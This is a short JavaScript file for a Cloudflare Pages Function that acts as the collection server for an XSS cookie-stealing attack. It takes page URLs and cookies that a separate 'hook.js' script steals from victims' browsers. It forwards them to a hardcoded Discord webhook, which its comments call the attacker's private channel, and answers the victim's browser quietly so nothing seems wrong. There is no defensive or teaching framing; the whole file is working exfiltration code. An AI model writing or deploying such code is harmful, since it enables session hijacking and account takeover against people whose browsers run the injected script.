// functions/api/loot.js - Cloudflare Pages Function

export async function onRequestPost(context) {
    try {
        // 1. Parse the stolen data sent by hook.js
        const loot = await context.request.json();
        
        // 2. The secret Discord Webhook URL
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488396759217606778/pRWuYwEBHnrDJf4TEL1OP-pcKV2vfNkAm-w9BSYK4OHXHjrjq2zsD2nDcX7tbeEVO07e";
        
        // 3. Format the Discord chat message
        const discordMessage = {
            username: "Cloudflare XSS Catcher",
            content: `🚨 **XSS HIT!** 🚨\n**URL:** ${loot.url}\n**Cookies:**\n\`\`\`text\n${loot.cookies}\n\`\`\``
        };

        // 4. Forward the loot to the attacker's private Discord
        await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(discordMessage)
        });

        // 5. Tell the victim's browser the request succeeded silently
        return new Response(JSON.stringify({ status: "success" }), {
            status: 200,
            headers: { "Content-Type": "application/json" }
        });

    } catch (error) {
        return new Response("Bad Request", { status: 400 });
    }
}
